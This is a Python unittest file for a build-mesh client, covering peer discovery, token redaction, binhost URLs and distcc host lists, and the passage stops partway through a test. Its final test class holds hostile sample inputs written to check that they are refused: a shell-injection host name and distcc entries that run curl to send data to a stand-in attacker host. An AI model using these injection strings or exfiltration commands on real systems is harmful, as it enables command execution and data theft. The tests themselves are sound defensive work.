"""Tests for the mesh client, run with no network and no real token.

Everything goes through a fake transport (same shape as `test_agent.Fake`): a
scripted list of responses plus the requests actually made. That makes the things
worth pinning assertable without a share daemon anywhere near the machine:

- a machine off the mesh is the normal case — `status` prints, nothing raises;
- a peer-state export is parsed into `Peer`/`Builder` from the fields the daemon
  really sends, and an empty mesh says so in words;
- an HTML error page, a truncated body and a timeout are all *reported*, not raised,
  because a slow or wrong endpoint must never fail a build;
- the token appears in exactly one place — the URL handed to portage — and in none
  of the human-visible ones: not in `redacted`, not in `status`, not in the shell
  lines the CLI prints, not in the briefing, not in an error message;
- `build_env` delegates to `forge.portage.binhost_env` instead of restating it, so
  the credential form and the signature policy keep one definition;
- the distcc host list is `host/limit` built from the route this node has, an empty
  one is a local build rather than an error, and the note says WHICH of the several
  reasons made it empty;
- a compile slot on this node's OWN machine is skipped rather than ranked last, and
  a peer whose gcc disagrees is skipped too, because distcc checks neither.

    python3 -m unittest aios.test_mesh -v
"""

from __future__ import annotations

import io
import json
import os
import subprocess
import tempfile
import unittest
import urllib.error
from contextlib import contextmanager, redirect_stderr, redirect_stdout
from pathlib import Path
from unittest import mock

from forge import cli, portage

from . import mesh, node

#: A value that would be unmistakable in any output that leaked it.
TOKEN = "sh4re-t0ken-do-not-print-me"
ENDPOINT = "http://host.docker.internal:4748"
CHOST = "aarch64-unknown-linux-musl"

#: The repo under test, from this file rather than the cwd — the shipped lockfile
#: is what `forge build` reads, so it is part of what these tests exercise.
REPO = Path(mesh.__file__).resolve().parents[1]

#: An /api/peer-state body with the fields src/share.ts `exportPeerState` sends.
PEER_STATE = {
    "host": "mac-studio",
    "machine_id": "7f1c-4d2e",
    "macs": ["aa:bb:cc:dd:ee:ff"],
    "exported_at": 1_769_000_000_000,
    "ollama": True,
    "builder": {
        "chost": CHOST,
        "cores": 10,
        "lock_digest": "sha256:feedface",
        "binpkgs": 137,
        "image": "ghcr.io/aios/builder:20260701",
        "running": True,
    },
    "agents": [{"name": "claude-1", "project": "AIos", "repo": "AIos",
                "activity": "minimizing vim", "last_seen_ago_s": 3}],
    "intents": [{"intent_id": "i1", "agent": "claude-1", "activity": "build",
                 "resources": [], "age_s": 4}],
    "leases": [{"lease_id": "l1", "agent": "claude-1", "resource": f"build:{CHOST}:app-editors/vim",
                "mode": "exclusive", "reason": "compiling", "expires_in_s": 600}],
    "memory": [{"id": "m1", "content": "note", "tags": [], "by": "claude-1", "age_s": 9}],
}


class Fake:
    """A scripted transport. Records every request; replays queued responses."""

    def __init__(self, *responses: object) -> None:
        self.queue = list(responses)
        self.urls: list[str] = []
        self.headers: list[dict] = []

    def __call__(self, url: str, headers: dict, timeout: float) -> bytes:
        self.urls.append(url)
        self.headers.append(headers)
        if not self.queue:
            raise AssertionError(f"transport ran dry after {len(self.urls)} requests")
        item = self.queue.pop(0)
        if isinstance(item, BaseException):
            raise item
        if isinstance(item, bytes):
            return item
        return json.dumps(item).encode("utf-8")


@contextmanager
def environment(**values: str | None):
    """Set env vars for the duration of a test, restoring exactly what was there.

    Every knob this module reads is an env var read on each call, so a test that
    forgets to restore one poisons the next.
    """
    previous = {key: os.environ.get(key) for key in values}
    try:
        for key, value in values.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value
        yield
    finally:
        for key, value in previous.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value


def with_token(**extra: str | None):
    return environment(**{mesh.TOKEN_ENV: TOKEN, mesh.URL_ENV: ENDPOINT, **extra})


def without_token(**extra: str | None):
    return environment(**{mesh.TOKEN_ENV: None, mesh.URL_ENV: ENDPOINT, **extra})


def remote_slot(*, address: str = "mabruk4.local", cores: int = 8, jobs: int = 8,
                port: int = 3632, running: bool = True, gcc: str = "15.3.0",
                peer_reachable: bool = True,
                distcc: object = ..., host: str = "mabruk4.local") -> mesh.Slot:
    """Another machine offering a live compile slot — the only kind worth having."""
    offer = (mesh.Distcc(port=port, running=running, gcc=gcc, jobs=jobs,
                         peer_reachable=peer_reachable)
             if distcc is ... else distcc)
    return mesh.Slot(host=host, address=address, local=False, cores=cores,
                     distcc=offer)   # type: ignore[arg-type]


def local_slot(**over: object) -> mesh.Slot:
    """This machine's own slot: advertised, reachable, and worth nothing."""
    slot = remote_slot(address="host.docker.internal", host="MacBookPro", **over)  # type: ignore[arg-type]
    return mesh.Slot(host=slot.host, address=slot.address, local=True,
                     cores=slot.cores, distcc=slot.distcc)


def slots(*entries: mesh.Slot) -> tuple[mesh.Slot, ...]:
    return tuple(entries)


class TestConfiguration(unittest.TestCase):
    def test_endpoint_defaults_to_the_route_a_pod_has_to_its_host(self) -> None:
        with environment(**{mesh.URL_ENV: None}):
            self.assertEqual(mesh.endpoint(), mesh.DEFAULT_URL)

    def test_endpoint_reads_the_environment_on_every_call(self) -> None:
        with environment(**{mesh.URL_ENV: "http://elsewhere:4748/"}):
            self.assertEqual(mesh.endpoint(), "http://elsewhere:4748")
        with environment(**{mesh.URL_ENV: "elsewhere:4748"}):
            self.assertEqual(mesh.endpoint(), "http://elsewhere:4748")


class TestMeshAbsent(unittest.TestCase):
    """A machine off the mesh is normal. Nothing may raise, and status must say so."""

    def test_status_prints_and_nothing_raises_with_no_daemon(self) -> None:
        transport = Fake(urllib.error.URLError("Name or service not known"))
        with without_token():
            view = mesh.look(transport)
            text = mesh.status(view)
        self.assertFalse(view.reachable)
        self.assertEqual(view.peers, ())
        self.assertIn("URLError", text)
        self.assertIn("peers     none", text)
        self.assertIn("compiles itself", text)

    def test_status_with_no_argument_never_raises(self) -> None:
        """`status` is offered as safe to run anywhere, so it must survive anything."""
        with without_token():
            with mock.patch.object(mesh, "_urlopen", side_effect=OSError("no route")):
                text = mesh.status()
        self.assertIn("endpoint", text)
        self.assertIn("is NOT set", text)

    def test_available_and_peers_are_false_and_empty_not_exceptions(self) -> None:
        for failure in (
            urllib.error.URLError("unreachable"),
            TimeoutError("timed out"),
            ConnectionRefusedError(61, "Connection refused"),
            OSError("host is down"),
        ):
            with self.subTest(failure=type(failure).__name__), without_token():
                self.assertFalse(mesh.available(Fake(failure)))
                self.assertEqual(mesh.peers(Fake(failure)), [])

    def test_a_timeout_is_reported_not_fatal(self) -> None:
        with without_token():
            view = mesh.look(Fake(TimeoutError("timed out")))
        self.assertFalse(view.reachable)
        self.assertIn("TimeoutError", view.detail)
        # And the build-facing question still has an answer.
        self.assertEqual(view.serving(CHOST), ())

    def test_the_timeout_is_short(self) -> None:
        """A slow mesh must not stall a build; the daemon's own budget is 2s."""
        self.assertLessEqual(mesh.TIMEOUT_S, 3.0)
        seen: list[float] = []

        def transport(url: str, headers: dict, timeout: float) -> bytes:
            seen.append(timeout)
            raise TimeoutError("timed out")

        with without_token():
            mesh.look(transport)
        self.assertEqual(seen, [mesh.TIMEOUT_S])


class TestPeerState(unittest.TestCase):
    """The response is parsed into Peers, using the fields the daemon really sends."""

    def test_peer_state_is_parsed(self) -> None:
        transport = Fake(PEER_STATE)
        with with_token():
            found = mesh.peers(transport)

        self.assertEqual(transport.urls, [ENDPOINT + mesh.PEER_STATE])
        self.assertEqual(len(found), 1)
        peer = found[0]
        self.assertEqual(peer.host, "mac-studio")
        self.assertEqual(peer.machine_id, "7f1c-4d2e")
        self.assertEqual(peer.exported_at, 1_769_000_000_000)
        self.assertTrue(peer.ollama)
        self.assertEqual(peer.url, ENDPOINT)
        self.assertEqual(peer.agents, ("claude-1",))
        self.assertEqual(peer.building, (f"build:{CHOST}:app-editors/vim",))

        assert peer.builder is not None
        self.assertEqual(peer.builder.chost, CHOST)
        self.assertEqual(peer.builder.cores, 10)
        self.assertEqual(peer.builder.binpkgs, 137)
        self.assertEqual(peer.builder.lock_digest, "sha256:feedface")
        self.assertTrue(peer.builder.running)
        self.assertTrue(peer.serves(CHOST))
        self.assertFalse(peer.serves("x86_64-pc-linux-gnu"))

    def test_the_bearer_header_carries_the_token_and_the_url_does_not(self) -> None:
        transport = Fake(PEER_STATE)
        with with_token():
            mesh.peers(transport)
        self.assertEqual(transport.headers[0]["Authorization"], f"Bearer {TOKEN}")
        self.assertNotIn(TOKEN, transport.urls[0])

    def test_no_token_means_no_authorization_header(self) -> None:
        transport = Fake(PEER_STATE)
        with without_token():
            mesh.peers(transport)
        self.assertNotIn("Authorization", transport.headers[0])

    def test_a_machine_without_a_builder_is_a_peer_that_cannot_help(self) -> None:
        """The verified normal case: a daemon is up, no container runtime is."""
        payload = {key: value for key, value in PEER_STATE.items() if key != "builder"}
        with without_token():
            view = mesh.look(Fake(payload))
        self.assertTrue(view.reachable)
        self.assertEqual(len(view.peers), 1)
        self.assertIsNone(view.peers[0].builder)
        self.assertEqual(view.serving(CHOST), ())
        text = mesh.status(view, target=CHOST)
        self.assertIn("no build capacity advertised", text)
        self.assertIn(f"Nothing on the mesh advertises {CHOST}", text)

    def test_an_empty_mesh_is_normal_and_says_so(self) -> None:
        """Not "0 peers" and nothing else: the reader has to know that is expected."""
        with without_token():
            view = mesh.look(Fake(urllib.error.URLError("no daemon")))
            text = mesh.status(view, target=CHOST)
            brief = mesh.briefing(view, target=CHOST)
        self.assertIn("peers     none", text)
        self.assertIn("normal state", text)
        self.assertIn("compiles itself", text)
        self.assertIn("normal", brief)
        self.assertIn("compiles itself", brief)

    def test_partial_and_wrongly_typed_fields_do_not_crash(self) -> None:
        """A field the daemon renamed must cost a value, not the whole look."""
        payload = {
            "host": "odd-one",
            "exported_at": "not-a-number",
            "builder": {"chost": CHOST, "cores": None, "binpkgs": "many"},
            "agents": "not-a-list",
            "leases": [None, {"resource": "kind-cluster:dazl-local"}],
        }
        with without_token():
            view = mesh.look(Fake(payload))
        peer = view.peers[0]
        self.assertEqual(peer.exported_at, 0)
        self.assertEqual(peer.agents, ())
        self.assertEqual(peer.leases, ("kind-cluster:dazl-local",))
        assert peer.builder is not None
        self.assertEqual(peer.builder.cores, 0)
        self.assertEqual(peer.builder.binpkgs, 0)
        self.assertEqual(peer.builder.lock_digest, "")


class TestMalformedResponses(unittest.TestCase):
    """Wrong thing on the port, right thing broken: reported, never raised."""

    def test_an_html_page_is_reported_not_crashed(self) -> None:
        html = b"<!DOCTYPE html><html><head><title>502 Bad Gateway</title></head></html>"
        with without_token():
            view = mesh.look(Fake(html))
            text = mesh.status(view)
        self.assertFalse(view.reachable)
        self.assertIn("not JSON", view.detail)
        self.assertIn("not a share daemon", view.detail)
        self.assertIn("DOCTYPE", view.detail)
        self.assertIn("not JSON", text)

    def test_control_characters_in_a_body_cannot_repaint_the_terminal(self) -> None:
        with without_token():
            view = mesh.look(Fake(b"\x1b[2J\x1b]0;pwned\x07 not json"))
        self.assertNotIn("\x1b", view.detail)
        self.assertNotIn("\x07", view.detail)

    def test_truncated_json_is_reported(self) -> None:
        with without_token():
            view = mesh.look(Fake(json.dumps(PEER_STATE).encode()[:80]))
        self.assertFalse(view.reachable)
        self.assertIn("not JSON", view.detail)

    def test_json_that_is_not_a_peer_state_is_rejected(self) -> None:
        for payload in ([], {"error": "nope"}, {"host": ""}, "a string"):
            with self.subTest(payload=payload), without_token():
                view = mesh.look(Fake(payload))
                self.assertFalse(view.reachable)
                self.assertIn("peer-state", view.detail)

    def test_a_401_names_the_token_that_is_missing_without_printing_one(self) -> None:
        error = urllib.error.HTTPError(
            ENDPOINT + mesh.PEER_STATE, 401, "unauthorized", {}, None
        )
        with without_token():
            unset = mesh.look(Fake(error))
        self.assertIn("401", unset.detail)
        self.assertIn(mesh.TOKEN_ENV, unset.detail)
        self.assertIn("not set", unset.detail)

        with with_token():
            wrong = mesh.look(Fake(error))
        self.assertIn("not accepted", wrong.detail)
        self.assertNotIn(TOKEN, wrong.detail)

    def test_an_oversized_body_is_capped(self) -> None:
        """A wrong endpoint serving an ISO must not be read into memory."""
        self.assertLessEqual(mesh.MAX_BYTES, 1 << 21)
        reads: list[int] = []

        class Body:
            def read(self, size: int) -> bytes:
                reads.append(size)
                return b"{}"

            def __enter__(self):
                return self

            def __exit__(self, *_) -> bool:
                return False

        with without_token(), mock.patch.object(mesh.urllib.request, "urlopen",
                                                return_value=Body()):
            mesh.look()
        self.assertEqual(reads, [mesh.MAX_BYTES])


class TestCredentialContainment(unittest.TestCase):
    """The token enters exactly one string, and that string goes only to portage."""

    def test_binhost_url_is_the_form_portage_can_use(self) -> None:
        with with_token():
            url = mesh.binhost_url("mac-studio")
        self.assertEqual(
            url, f"http://portage:{TOKEN}@mac-studio:4748/api/build/binpkg/"
        )

    def test_redacted_never_contains_the_token(self) -> None:
        with with_token():
            shown = mesh.redacted("mac-studio")
        self.assertNotIn(TOKEN, shown)
        self.assertIn(mesh.REDACTION, shown)
        self.assertIn("/api/build/binpkg/", shown)

    def test_no_human_visible_surface_carries_the_token(self) -> None:
        transport = Fake(PEER_STATE)
        with with_token():
            view = mesh.look(transport)
            surfaces = {
                "status": mesh.status(view, target=CHOST),
                "briefing": mesh.briefing(view, target=CHOST),
                "shell_env": mesh.shell_env(view.peers[0]),
                "redacted": mesh.redacted(view.peers[0]),
                "peers repr": repr(view.peers),
                "detail": view.detail,
                "node briefing": node.briefing(node.Role(tree=True, serving=True, mesh=view)),
            }
        for name, text in surfaces.items():
            with self.subTest(surface=name):
                self.assertNotIn(TOKEN, text)

    def test_the_cli_prints_a_reference_to_the_token_not_its_value(self) -> None:
        out, err = io.StringIO(), io.StringIO()
        with with_token():
            with redirect_stdout(out), redirect_stderr(err):
                code = mesh.main(["env", "mac-studio"])
        printed = out.getvalue()
        self.assertEqual(code, 0)
        self.assertNotIn(TOKEN, printed + err.getvalue())
        # A reference is what makes the output both usable and safe: the shell
        # substitutes the value at eval time. It is spliced in around `shlex.quote`
        # rather than sitting inside it — quoted with the rest, it would come out
        # single-quoted and stop expanding, which is the whole point of the line.
        self.assertIn("${%s}" % mesh.TOKEN_ENV, printed)
        self.assertIn(
            'export PORTAGE_BINHOST=http://portage:"${%s}"@' % mesh.TOKEN_ENV, printed
        )
        self.assertIn("export FEATURES=", printed)

    def test_the_env_lines_expand_the_token_when_a_shell_evals_them(self) -> None:
        """The output is only useful if `eval` reconstitutes the real URL."""
        out = io.StringIO()
        with with_token():
            with redirect_stdout(out), redirect_stderr(io.StringIO()):
                mesh.main(["env", "mac-studio"])
            expected = mesh.binhost_url("mac-studio")
        result = subprocess.run(
            ["bash", "-c", f'{out.getvalue()}\nprintf %s "$PORTAGE_BINHOST"'],
            capture_output=True, text=True, stdin=subprocess.DEVNULL,
            env={"PATH": os.environ.get("PATH", "/usr/bin:/bin"), mesh.TOKEN_ENV: TOKEN},
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout, expected)

    def test_the_cli_says_when_no_token_is_set_without_inventing_one(self) -> None:
        out, err = io.StringIO(), io.StringIO()
        with without_token():
            with redirect_stdout(out), redirect_stderr(err):
                code = mesh.main(["env"])
        self.assertEqual(code, 0)
        self.assertIn("is not set", err.getvalue())
        self.assertNotIn("${%s}" % mesh.TOKEN_ENV, out.getvalue())
        self.assertIn(mesh.DEFAULT_URL.split("//")[1], out.getvalue())

    def test_forge_build_never_prints_the_url_it_was_handed(self) -> None:
        """`forge build --peer` is the caller `binhost_url` exists for, so it leaks.

        The composition is the natural one and the docstring on `binhost_url` says
        what is in the string: `forge build --peer "$(python3 -c 'import aios.mesh;
        print(aios.mesh.binhost_url())')"`. The agent can run it, and every tool call
        and its output is journalled to .aios/agent.jsonl — so a print here writes a
        live credential to disk permanently.

        `which` is mocked so the assertion is about forge's output and not about
        whether this host happens to have portage (skills/host-dependent-assertions).
        """
        out, err = io.StringIO(), io.StringIO()
        with with_token():
            url = mesh.binhost_url("mac-studio")
            self.assertIn(TOKEN, url, "the fixture must actually carry a credential")
            with mock.patch.object(cli.shutil, "which", return_value=None):
                with redirect_stdout(out), redirect_stderr(err):
                    cli.main(["--lock", str(REPO / "aios.lock.json"),
                              "build", "--peer", url])
        printed = out.getvalue() + err.getvalue()
        self.assertNotIn(TOKEN, printed)
        # Redacted, not silent: the operator still has to see which peer was used.
        self.assertIn("mac-studio:4748/api/build/binpkg/", printed)
        self.assertIn(mesh.REDACTION, printed)

    def test_the_same_leak_through_the_environment_variable(self) -> None:
        """AIOS_BINHOST is the other half of the same argument, and the same print."""
        out, err = io.StringIO(), io.StringIO()
        with with_token(AIOS_BINHOST=mesh.binhost_url("mac-studio")):
            with mock.patch.object(cli.shutil, "which", return_value=None):
                with redirect_stdout(out), redirect_stderr(err):
                    cli.main(["--lock", str(REPO / "aios.lock.json"), "build"])
        self.assertNotIn(TOKEN, out.getvalue() + err.getvalue())

    def test_scrub_removes_a_credential_that_arrived_from_elsewhere(self) -> None:
        with with_token():
            self.assertNotIn(
                TOKEN, mesh.scrub(f"fetching http://portage:{TOKEN}@peer:4748/x failed")
            )
            self.assertNotIn(TOKEN, mesh.scrub(f"Authorization: Bearer {TOKEN}"))
            self.assertEqual(mesh.scrub("http://peer:4748/x"), "http://peer:4748/x")

    def test_a_token_in_the_endpoint_url_is_scrubbed_from_every_report(self) -> None:
        """AIOS_MESH_URL is not a credential — but nothing stops someone putting one in."""
        with environment(**{mesh.URL_ENV: f"http://x:{TOKEN}@host.docker.internal:4748",
                            mesh.TOKEN_ENV: None}):
            view = mesh.look(Fake(OSError("nope")))
            surfaces = (mesh.status(view), mesh.briefing(view), view.detail)
        for text in surfaces:
            self.assertNotIn(TOKEN, text)

    def test_an_error_message_quoting_the_token_is_scrubbed(self) -> None:
        with with_token():
            view = mesh.look(Fake(OSError(f"proxy rejected Bearer {TOKEN}")))
        self.assertNotIn(TOKEN, view.detail)
        self.assertIn(mesh.REDACTION, view.detail)


class TestBuildEnv(unittest.TestCase):
    """One definition of the binhost policy, imported rather than restated."""

    def test_build_env_delegates_to_forge_portage(self) -> None:
        with with_token():
            with mock.patch.object(portage, "binhost_env",
                                   wraps=portage.binhost_env) as delegate:
                env = mesh.build_env("mac-studio")
        delegate.assert_called_once_with(
            "http://mac-studio:4748/api/build/binpkg/", TOKEN
        )
        self.assertEqual(env, portage.binhost_env(
            "http://mac-studio:4748/api/build/binpkg/", TOKEN))

    def test_build_env_is_exactly_the_shared_policy(self) -> None:
        """If forge's policy changes, this must change with it — hence no local copy."""
        with with_token():
            env = mesh.build_env("mac-studio")
        self.assertEqual(
            set(env), {"PORTAGE_BINHOST", "FEATURES", "PORTAGE_TRUST_HELPER"}
        )
        # The FEATURES line is the peer-package policy; portage owns its wording.
        self.assertEqual(
            env["FEATURES"],
            portage.binhost_env("http://x/", "t")["FEATURES"],
        )
        # Waiving the signature requirement is not enough on its own: portage runs
        # PORTAGE_TRUST_HELPER (default `getuto`) before any binpkg operation, and on
        # a keyring-less stage3 it HANGS holding portage's lock — measured at 14
        # minutes with zero CPU and no output. Verified against a real node: with
        # this unset, an emerge of seven cached binpkgs never finished; with it, it
        # finished in seconds.
        self.assertEqual(env["PORTAGE_TRUST_HELPER"], "/bin/true")

    def test_mesh_does_not_construct_the_policy_itself(self) -> None:
        """The literals a second definition would need are absent from this module.

        Asserted on the dict keys a duplicate would have to write, not on the
        policy's words: a bare `assertNotIn("binpkg-request-signature")` matches the
        docstring explaining the delegation, which is the mistake
        skills/negative-assertions is about.
        """
        source = Path(mesh.__file__).read_text(encoding="utf-8")
        for literal in ('"FEATURES"', "'FEATURES'", '"PORTAGE_BINHOST":', "portage:%s@",
                        '"DISTCC_HOSTS":', '"DISTCC_FALLBACK":'):
            self.assertNotIn(literal, source, "the binhost policy lives in forge.portage")

    def test_build_env_without_a_token_is_a_plain_url(self) -> None:
        with without_token():
            env = mesh.build_env("mac-studio")
        self.assertEqual(
            env["PORTAGE_BINHOST"], "http://mac-studio:4748/api/build/binpkg/"
        )

    def test_a_peer_a_hostname_and_a_url_all_resolve(self) -> None:
        peer = mesh.Peer(host="mac-studio", url="http://192.168.5.2:4748")
        with without_token():
            self.assertEqual(
                mesh.build_env(peer)["PORTAGE_BINHOST"],
                "http://192.168.5.2:4748/api/build/binpkg/",
            )
            self.assertEqual(
                mesh.build_env("http://peer:9999/")["PORTAGE_BINHOST"],
                "http://peer:9999/api/build/binpkg/",
            )
            # No target at all means "the daemon this node already talks to".
            self.assertEqual(
                mesh.build_env()["PORTAGE_BINHOST"],
                ENDPOINT + "/api/build/binpkg/",
            )


def compile_peer(url: str = "http://mabruk4.local:4748", cores: int = 8,
                 chost: str = CHOST) -> mesh.Mesh:
    """A reachable mesh with one machine advertising build capacity.

    Built by hand rather than from PEER_STATE so the host and the core count are the
    test's, not a fixture's — the format is the thing under test.
    """
    peer = mesh.Peer(host="MabrukV.local", url=url,
                     builder=mesh.Builder(chost=chost, cores=cores))
    return mesh.Mesh(ENDPOINT, True, "", (peer,))


class TestDistcc(unittest.TestCase):
    """Compile jobs rather than finished packages: plumbed here, unserved out there.

    Every test passes `target=` explicitly. `chost()` would otherwise read whatever
    lockfile happens to be beside the test run, which is the mistake in
    skills/host-dependent-assertions.
    """

    def test_a_remote_slot_becomes_an_entry(self) -> None:
        self.assertEqual(
            mesh.distcc_hosts(None, CHOST, slots(remote_slot())), ["mabruk4.local/8"]
        )

    def test_this_machines_own_slot_is_not_capacity(self) -> None:
        """The finding this route exists for, and the one nothing else would catch.

        A slot on the host this node runs on is the same cores with a network round
        trip in front of them: measured on an M1 Max, 8 performance cores shared by
        colima, the node's pod and the builder container. Ranking it last would still
        send jobs to it whenever it was the only entry, so it is skipped outright.
        """
        self.assertEqual(mesh.distcc_hosts(None, CHOST, slots(local_slot())), [])

    def test_a_local_slot_does_not_hide_a_real_remote_one(self) -> None:
        found = slots(local_slot(), remote_slot())
        self.assertEqual(mesh.distcc_hosts(None, CHOST, found), ["mabruk4.local/8"])

    def test_a_builder_with_no_distccd_listening_is_not_a_slot(self) -> None:
        """Cores are not a compile slot: something has to answer on the port."""
        self.assertEqual(
            mesh.distcc_hosts(None, CHOST, slots(remote_slot(running=False))), []
        )

    def test_a_peer_bound_to_its_own_loopback_is_not_a_slot(self) -> None:
        """Up, and closed to this machine: every job sent there would fail.

        The safe default is a loopback bind, because distccd authenticates nothing.
        That makes "running" and "usable by me" different facts, and a consumer that
        conflated them would break builds wherever DISTCC_FALLBACK is off.
        """
        found = slots(remote_slot(peer_reachable=False))
        self.assertEqual(mesh.distcc_hosts(None, CHOST, found), [])

    def test_the_note_explains_a_loopback_bound_peer_and_where_to_change_it(self) -> None:
        note = mesh.distcc_note([], None, CHOST, slots(remote_slot(peer_reachable=False)))
        self.assertIn("loopback", note)
        self.assertIn("builder.distcc.bind", note)

    def test_a_peer_with_no_distcc_at_all_is_not_a_slot(self) -> None:
        self.assertEqual(
            mesh.distcc_hosts(None, CHOST, slots(remote_slot(distcc=None))), []
        )

    def test_a_disagreeing_compiler_is_skipped_rather_than_trusted(self) -> None:
        """distcc validates no compiler, so a mismatch corrupts instead of failing."""
        found = slots(remote_slot(gcc="15.1.0"))
        with mock.patch.object(mesh, "local_gcc", return_value="15.3.0"):
            self.assertEqual(mesh.distcc_hosts(None, CHOST, found), [])

    def test_a_matching_compiler_is_used(self) -> None:
        found = slots(remote_slot(gcc="15.3.0"))
        with mock.patch.object(mesh, "local_gcc", return_value="15.3.0"):
            self.assertEqual(mesh.distcc_hosts(None, CHOST, found), ["mabruk4.local/8"])

    def test_an_unknown_version_on_either_side_is_not_called_a_mismatch(self) -> None:
        """The mesh's builders share a pinned stage3; unreadable is not evidence."""
        with mock.patch.object(mesh, "local_gcc", return_value=""):
            self.assertEqual(
                mesh.distcc_hosts(None, CHOST, slots(remote_slot(gcc="15.3.0"))),
                ["mabruk4.local/8"],
            )
        with mock.patch.object(mesh, "local_gcc", return_value="15.3.0"):
            self.assertEqual(
                mesh.distcc_hosts(None, CHOST, slots(remote_slot(gcc=""))),
                ["mabruk4.local/8"],
            )

    def test_a_non_default_port_is_written_into_the_entry(self) -> None:
        """A peer may publish distccd anywhere; assuming 3632 sends jobs nowhere."""
        self.assertEqual(
            mesh.distcc_hosts(None, CHOST, slots(remote_slot(port=4632))),
            ["mabruk4.local:4632/8"],
        )

    def test_a_slot_reporting_no_jobs_still_yields_a_usable_entry(self) -> None:
        """distcc rejects the WHOLE list over one bad entry, so `/0` may never be emitted."""
        self.assertEqual(
            mesh.distcc_hosts(None, CHOST, slots(remote_slot(jobs=0, cores=0))),
            ["mabruk4.local/1"],
        )

    def test_an_empty_mesh_is_an_empty_host_list_and_not_an_error(self) -> None:
        with without_token():
            view = mesh.look(Fake(urllib.error.URLError("no daemon")))
            hosts = mesh.distcc_hosts(view, CHOST, ())
            env = mesh.distcc_env(view, target=CHOST)
        self.assertEqual(hosts, [])
        self.assertEqual(env["DISTCC_HOSTS"], "")
        # Empty means "compile everything here", and the switch that guarantees it is
        # stated rather than left to distcc's default.
        self.assertEqual(env["DISTCC_FALLBACK"], "1")

    def test_compile_slots_reads_the_build_hosts_route_not_peer_state(self) -> None:
        """The distinction the whole feature rests on — see `compile_slots`."""
        body = {"chost": CHOST, "hosts": [
            {"host": "mabruk4.local", "address": "10.10.20.44", "local": False,
             "builder": {"chost": CHOST, "cores": 12,
                         "distcc": {"port": 3632, "running": True,
                                    "gcc": "15.3.0", "jobs": 12,
                                    "peer_reachable": True}}},
        ]}
        transport = Fake(body)
        with with_token():
            found = mesh.compile_slots(CHOST, transport)
        self.assertIn(mesh.BUILD_HOSTS_PATH, transport.urls[0])
        self.assertNotIn(mesh.PEER_STATE, transport.urls[0])
        self.assertEqual(len(found), 1)
        self.assertFalse(found[0].local)
        self.assertEqual(found[0].address, "10.10.20.44")
        self.assertEqual(found[0].distcc.gcc, "15.3.0")

    def test_a_daemon_too_old_for_the_route_means_no_slots_not_a_crash(self) -> None:
        with without_token():
            self.assertEqual(mesh.compile_slots(CHOST, Fake(urllib.error.URLError("no"))), ())
            self.assertEqual(mesh.compile_slots(CHOST, Fake(b"<html>404</html>")), ())

    def test_an_entry_missing_local_is_read_as_local(self) -> None:
        """The conservative direction: an old daemon must not look like free cores."""
        body = {"hosts": [{"host": "old", "address": "10.0.0.9",
                           "builder": {"chost": CHOST, "cores": 8,
                                       "distcc": {"port": 3632, "running": True,
                                                  "gcc": "", "jobs": 8}}}]}
        with without_token():
            found = mesh.compile_slots(CHOST, Fake(body))
        self.assertTrue(found[0].local)
        self.assertEqual(mesh.distcc_hosts(None, CHOST, found), [])

    def test_distcc_env_delegates_to_forge_portage(self) -> None:
        """One definition of "topology lives in the environment", as with build_env."""
        found = slots(remote_slot())
        with mock.patch.object(mesh, "compile_slots", return_value=found), \
             mock.patch.object(portage, "distcc_env", wraps=portage.distcc_env) as delegate:
            env = mesh.distcc_env(target=CHOST)
        delegate.assert_called_once_with(["mabruk4.local/8"])
        self.assertEqual(env, portage.distcc_env(["mabruk4.local/8"]))

    def test_the_note_says_local_only_when_that_is_the_reason(self) -> None:
        """The empty list has several causes and the useless one is "empty"."""
        note = mesh.distcc_note([], None, CHOST, slots(local_slot()))
        self.assertIn("THIS machine", note)
        self.assertIn("network round trip", note)
        self.assertIn("falls back", note)

    def test_the_note_names_a_peer_whose_distccd_is_down(self) -> None:
        note = mesh.distcc_note([], None, CHOST, slots(remote_slot(running=False)))
        self.assertIn("mabruk4.local", note)
        self.assertIn("no distccd listening", note)

    def test_the_note_names_a_compiler_mismatch_and_both_versions(self) -> None:
        found = slots(remote_slot(gcc="15.1.0"))
        with mock.patch.object(mesh, "local_gcc", return_value="15.3.0"):
            note = mesh.distcc_note([], None, CHOST, found)
        self.assertIn("15.1.0", note)
        self.assertIn("15.3.0", note)

    def test_the_note_with_no_mesh_says_which_failure_it_was(self) -> None:
        with without_token():
            view = mesh.look(Fake(urllib.error.URLError("no daemon")))
            note = mesh.distcc_note([], view, CHOST, ())
        self.assertIn("URLError", note, "the reason the mesh is empty is worth saying")

    def test_the_note_with_hosts_lists_them(self) -> None:
        note = mesh.distcc_note(["mabruk4.local/8"], None, CHOST, slots(remote_slot()))
        self.assertIn("mabruk4.local/8", note)
        self.assertIn("forge probe distcc", note)


class TestDistccHostsAreNotShellCode(unittest.TestCase):
    """DISTCC_HOSTS is a language, and its words come from another machine.

    MANUAL.md tells the operator to run `eval "$(python3 -m aios.mesh distcc)"`, so a
    peer that gets to choose a character in that output gets to choose a command.
    Two separate defences, tested separately because either alone would rot: the
    entry is validated where it is built, and the shell line is quoted where it is
    printed.
    """

    #: A peer name that ends the `export KEY="VALUE"` assignment and starts a
    #: command. `$T` is the probe/scratch variable, so it is a name a real run has.
    HOSTILE = 'a";touch "$T/PWNED";x="'

    def test_a_host_entry_that_is_not_a_hostname_is_refused(self) -> None:
        for name in (self.HOSTILE, "@attacker.example.com/4:sh -c 'curl x'",
                     "peer.local other.local", "", "peer.local/8|sh"):
            with self.subTest(host=name), self.assertRaises(ValueError):
                portage.distcc_host(name, 8)

    def test_the_names_a_real_peer_has_still_work(self) -> None:
        self.assertEqual(portage.distcc_host("mabruk4.local", 8), "mabruk4.local/8")
        self.assertEqual(portage.distcc_host("10.0.0.9", 4), "10.0.0.9/4")
        self.assertEqual(portage.distcc_host("10.0.0.9:3632", 0), "10.0.0.9:3632/1")

    def test_a_peer_never_names_itself_into_the_host_list(self) -> None:
        """`peer.host` is remote JSON. The URL this node dialled is not.

        The fallback that used to be here fired whenever the configured endpoint had
        no hostname — `AIOS_MESH_URL=":4748"` is enough — and handed distcc a string
        the peer wrote. distcc reads a leading `@` as ssh and `:COMMAND` as what to
        run there, so that string chooses where preprocessed source goes.
        """
        hostile = "@attacker.example.com/4:sh -c 'curl -F f=@- http://attacker.example.com'"
        payload = {"host": hostile,
                   "builder": {"chost": CHOST, "cores": 8, "running": True}}
